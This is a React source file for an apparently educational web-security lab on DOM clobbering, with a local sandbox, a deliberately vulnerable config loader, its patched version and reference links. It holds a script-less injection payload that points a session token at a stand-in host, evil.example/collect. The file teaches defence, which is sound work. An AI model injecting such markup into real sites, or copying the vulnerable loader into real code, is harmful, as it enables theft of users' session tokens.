import { useCallback, useState } from "react";
import { FileCode2, Info } from "lucide-react";
import LabLayout from "../components/LabLayout.jsx";
import SandboxShell from "../components/SandboxShell.jsx";
import PayloadButton from "../components/PayloadButton.jsx";
import XRayConsole, { logEntry } from "../components/XRayConsole.jsx";
import { LABS } from "../lib/labsMeta.js";

const meta = LABS[0];

/* ─────────────────────────────────────────────────────────────────────────
   REAL SIMULATION — DOM clobbering.

   The victim config loader reads window.CONFIG.apiUrl to decide where to send
   the auth token. The attacker injects HTML (no <script>) containing elements
   whose id/name attributes create a DOM collection named CONFIG, "clobbering"
   the global the victim trusts.

   - Vulnerable mode: victim does `const cfg = window.CONFIG || defaults`.
     When clobbered, window.CONFIG is an HTMLCollection whose nested named
     elements resolve to attacker strings → token is sent to the attacker.
   - Fixed mode: victim keeps config in a real JS variable and ignores the
     DOM-derived global entirely → clobbering has nothing to grab.

   To keep the demo deterministic, the clobbered lookup is modelled with a live
   container element the attacker HTML is parsed into and read back, so the
   name-resolution really happens in the DOM, not via a hardcoded string.
   ───────────────────────────────────────────────────────────────────────── */

const SAFE_API = "https://api.domino.app/v1";
const ATTACKER_API = "https://evil.example/collect";

// Attacker-supplied markup injected into a comment/avatar field that is
// rendered as HTML. No script tag — just ids and names.
const CLOBBER_HTML = `<a id="CONFIG"><a id="CONFIG" name="apiUrl" href="${ATTACKER_API}">x</a>`;

const INITIAL = {
  injected: false,
  resolvedApi: SAFE_API,
  tokenDestination: null,
  exploited: false,
};

const PAYLOADS = [
  {
    index: 1,
    label: "Inject Clobbering HTML",
    desc: "Posts <a id=CONFIG> markup into a field rendered as HTML — defines window.CONFIG via the DOM.",
    kind: "inject",
  },
  {
    index: 2,
    label: "Trigger Token Send",
    desc: "Runs the victim's loader, which reads window.CONFIG.apiUrl to pick the token endpoint.",
    kind: "send",
  },
];

// Reads a "config" the way the vulnerable loader would: first any real global,
// then the DOM-derived one. We parse the injected HTML into a detached
// container and resolve CONFIG.apiUrl through actual named-element lookup.
function resolveConfigFromDom(injectedHtml) {
  const container = document.createElement("div");
  container.innerHTML = injectedHtml;
  // Named-element access: the browser exposes id'd elements as properties.
  // We emulate window.CONFIG by looking up the element whose id is CONFIG and
  // then its descendant named "apiUrl" — exactly what document.CONFIG.apiUrl
  // would yield when this markup is live in the page.
  const root = container.querySelector("#CONFIG");
  if (!root) return null;
  const apiEl = root.parentElement?.querySelector('[name="apiUrl"]') ?? root.querySelector('[name="apiUrl"]');
  // The href attribute surfaces as the element's string value in this access
  // pattern (anchors stringify to their href).
  return apiEl ? apiEl.getAttribute("href") : null;
}

function ConfigWidget({ state, mode }) {
  const exploited = state.exploited;
  const protectedMode = mode === "fixed";
  return (
    <div
      className={`rounded-xl border bg-slate-950/70 p-5 transition-all duration-300 ease-out ${
        exploited
          ? "animate-breach border-red-500/50"
          : protectedMode
            ? "border-emerald-500/30"
            : "border-slate-700"
      }`}
    >
      <div className="flex items-center justify-between">
        <div className="flex items-center gap-2">
          <span className="flex h-8 w-8 items-center justify-center rounded-lg border border-violet-500/30 bg-violet-500/10">
            <FileCode2 size={15} className="text-violet-400" />
          </span>
          <div>
            <p className="text-sm font-semibold text-slate-100">Account Settings</p>
            <p className="font-mono text-[10px] text-slate-500">config loader · demo</p>
          </div>
        </div>
        <span
          className={`rounded-full border px-2.5 py-1 font-mono text-[10px] font-bold tracking-wider transition-all duration-300 ${
            exploited
              ? "border-red-500/40 bg-red-500/10 text-red-400"
              : protectedMode
                ? "border-emerald-500/40 bg-emerald-500/10 text-emerald-400"
                : "border-amber-500/40 bg-amber-500/10 text-amber-400"
          }`}
        >
          {exploited ? "EXPLOITED" : protectedMode ? "PROTECTED" : "LOADED"}
        </span>
      </div>

      <div className="mt-5 space-y-3">
        <div className="rounded-lg border border-slate-800 bg-slate-900/60 px-3 py-2.5">
          <p className="text-[11px] text-slate-500">window.CONFIG.apiUrl resolves to</p>
          <p
            className={`mt-0.5 font-mono text-xs transition-colors duration-300 ${
              state.resolvedApi === ATTACKER_API ? "text-red-400" : "text-slate-300"
            }`}
          >
            {state.resolvedApi}
          </p>
        </div>

        <div className="rounded-lg border border-slate-800 bg-slate-900/60 px-3 py-2.5">
          <p className="text-[11px] text-slate-500">Session token destination</p>
          <p
            className={`mt-0.5 font-mono text-xs transition-colors duration-300 ${
              state.tokenDestination === ATTACKER_API
                ? "text-red-400"
                : state.tokenDestination
                  ? "text-emerald-400"
                  : "text-slate-500"
            }`}
          >
            {state.tokenDestination ?? "— not sent yet —"}
          </p>
        </div>
      </div>

      <p className="mt-3 font-mono text-[11px] leading-5 text-slate-500">
        ▸ {state.injected ? "Untrusted HTML present in profile field." : "No injected markup."}
      </p>
    </div>
  );
}

function Lab01Sandbox() {
  const [mode, setMode] = useState("vulnerable");
  const [state, setState] = useState(INITIAL);
  const [logs, setLogs] = useState([]);

  const addLog = useCallback((fields) => {
    setLogs((prev) => [...prev, logEntry(fields)]);
  }, []);

  const reset = useCallback((nextMode) => {
    setState(INITIAL);
    setLogs([
      logEntry({
        origin: "domino://sandbox",
        status: "INFO",
        detail:
          nextMode === "fixed"
            ? "Fixed mode armed — config kept in a real JS variable; the DOM global is never read."
            : "Vulnerable mode armed — loader reads window.CONFIG, which the DOM can define.",
      }),
    ]);
  }, []);

  const changeMode = (next) => {
    setMode(next);
    reset(next);
  };

  const fire = (payload) => {
    if (payload.kind === "inject") {
      setState((s) => ({ ...s, injected: true }));
      addLog({
        origin: "user-content (rendered as HTML)",
        payload: CLOBBER_HTML,
        status: "SENT",
        detail: "Attacker markup inserted into a profile field — note: zero <script> tags.",
      });
      return;
    }

    // "send" — run the victim loader.
    if (mode === "fixed") {
      // THE FIX: config comes from a real variable, DOM global ignored.
      setState((s) => ({
        ...s,
        resolvedApi: SAFE_API,
        tokenDestination: SAFE_API,
        exploited: false,
      }));
      addLog({
        origin: "window.location.origin",
        payload: "config.apiUrl (local const)",
        status: "BLOCKED",
        detail: `Loader used the hardcoded const (${SAFE_API}); window.CONFIG from the DOM was never consulted — clobbering had nothing to hit.`,
      });
      return;
    }

    // VULNERABLE: read window.CONFIG, which the injected DOM now defines.
    const domValue = state.injected ? resolveConfigFromDom(CLOBBER_HTML) : null;
    const api = domValue || SAFE_API;
    const exploited = api === ATTACKER_API;
    setState((s) => ({
      ...s,
      resolvedApi: api,
      tokenDestination: api,
      exploited,
    }));
    addLog({
      origin: "window.location.origin",
      payload: "window.CONFIG.apiUrl",
      status: exploited ? "EXECUTED" : "INFO",
      detail: exploited
        ? `window.CONFIG was clobbered by the DOM → apiUrl resolved to ${api}. Session token exfiltrated.`
        : "window.CONFIG is undefined — fell back to defaults. Inject the clobbering HTML first (Payload 1).",
    });
  };

  return (
    <SandboxShell
      mode={mode}
      onModeChange={changeMode}
      onReset={() => reset(mode)}
      victim={<ConfigWidget state={state} mode={mode} />}
      attacker={
        <div className="space-y-3">
          <div className="flex items-start gap-2 rounded-lg border border-slate-800 bg-slate-950/50 px-3 py-2 text-[11px] leading-5 text-slate-500">
            <Info size={13} className="mt-0.5 shrink-0" />
            <span>
              Run Payload 1 then Payload 2. The clobbering HTML defines{" "}
              <span className="font-mono text-slate-400">window.CONFIG</span> with
              no script — the loader trusts it.
            </span>
          </div>

          {PAYLOADS.map((p) => (
            <PayloadButton
              key={p.index}
              index={p.index}
              label={p.label}
              desc={p.desc}
              onClick={() => fire(p)}
            />
          ))}

          <XRayConsole logs={logs} onClear={() => setLogs([])} />
        </div>
      }
    />
  );
}

/* ── Static lab content ─────────────────────────────────────────────────── */

const VULN_CODE = {
  title: "config-loader.js — vulnerable",
  lines: [
    { code: "// Profile fields are rendered as HTML (sanitizer strips <script>)" },
    { code: "function loadConfig() {" },
    {
      code: "  const cfg = window.CONFIG || DEFAULTS;",
      hl: "red",
      note: "window.CONFIG can be defined by HTML alone — <a id=CONFIG> clobbers this global with no script needed.",
    },
    { code: "  return cfg;" },
    { code: "}" },
    { code: "" },
    { code: "function sendToken() {" },
    { code: "  const { apiUrl } = loadConfig();" },
    { code: "  fetch(apiUrl, {" },
    { code: "    method: 'POST'," },
    { code: "    body: JSON.stringify({ token: session.token })," },
    { code: "  }); // token goes wherever apiUrl points" },
    { code: "}" },
  ],
};

const FIX_CODE = {
  title: "config-loader.js — patched",
  lines: [
    { code: "// Config lives in a module-scoped constant, not a global" },
    {
      code: "const CONFIG = Object.freeze({ apiUrl: 'https://api.domino.app/v1' });",
      hl: "green",
      note: "A real JS binding cannot be clobbered by DOM named-element access; frozen so it cannot be reassigned.",
    },
    { code: "" },
    { code: "function sendToken() {" },
    { code: "  fetch(CONFIG.apiUrl, {" },
    { code: "    method: 'POST'," },
    { code: "    body: JSON.stringify({ token: session.token })," },
    { code: "  });" },
    { code: "}" },
  ],
};

export default function Lab01DomClobbering() {
  return (
    <LabLayout
      meta={meta}
      what={
        <>
          DOM clobbering is a script-less injection technique: an attacker who
          can inject HTML (but not{" "}
          <code className="text-emerald-400">&lt;script&gt;</code>) uses{" "}
          <code className="text-emerald-400">id</code> and{" "}
          <code className="text-emerald-400">name</code> attributes to create
          named properties on <code className="text-emerald-400">document</code>{" "}
          and <code className="text-emerald-400">window</code>. When application
          code reads a global like{" "}
          <code className="text-emerald-400">window.CONFIG</code>, the attacker's
          markup silently supplies the value. It defeats sanitizers that only
          block scripts, because the payload is plain, "harmless" HTML.
        </>
      }
      vulnCode={VULN_CODE}
      sandbox={<Lab01Sandbox />}
      why={
        <>
          Clobbering lets injected markup overwrite the variables that guard
          security decisions — API endpoints, callback URLs, sanitizer configs —
          turning a mild HTML-injection flaw into token theft or full script
          execution when the clobbered value feeds a sink. It routinely bypasses
          HTML sanitizers precisely because it contains no JavaScript to strip.
        </>
      }
      incident={{
        title: "Gmail AMP4Email DOM clobbering (2019)",
        text: "Researcher Michał Bentkowski demonstrated a DOM clobbering bypass of Gmail's AMP4Email sanitizer: crafted id attributes clobbered properties the sanitizer relied on, undermining its allowlist — a case study now cited across OWASP and PortSwigger DOM-clobbering material.",
      }}
      fixCode={FIX_CODE}
      sources={[
        {
          label: "PortSwigger Academy — DOM clobbering",
          href: "https://portswigger.net/web-security/dom-based/dom-clobbering",
        },
        {
          label: "MDN — HTMLCollection & named element access",
          href: "https://developer.mozilla.org/en-US/docs/Web/API/HTMLCollection",
        },
        {
          label: "OWASP — DOM based XSS Prevention Cheat Sheet",
          href: "https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html",
        },
        {
          label: "CWE-79 — Improper Neutralization (XSS)",
          href: "https://cwe.mitre.org/data/definitions/79.html",
        },
      ]}
    />
  );
}
